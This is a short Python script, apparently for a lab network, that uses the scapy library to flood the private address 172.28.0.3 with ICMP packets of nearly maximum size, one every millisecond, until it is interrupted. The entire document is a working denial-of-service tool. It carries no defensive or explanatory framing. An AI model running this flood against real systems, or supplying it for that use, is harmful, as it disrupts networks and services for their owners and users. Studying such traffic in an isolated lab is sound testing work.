from scapy.all import IP, ICMP, send
import time

target_ip = "172.28.0.3"
packet_size = 65500  # total ICMP data size (payload)
interval = 0.001     # interval in seconds (1 ms)

# Calculate payload to get approximate packet size
# IP header = 20 bytes, ICMP header = 8 bytes
payload_size = packet_size - 20 - 8
payload = b'X' * payload_size  # fill payload with 'X'

packet = IP(dst=target_ip)/ICMP()/payload

print(f"[+] Starting ping flood on {target_ip} with packets of {packet_size} bytes every {interval*1000} ms")

try:
    while True:
        send(packet, verbose=0)
        time.sleep(interval)
except KeyboardInterrupt:
    print("\n[!] Ping flood interrupted by user")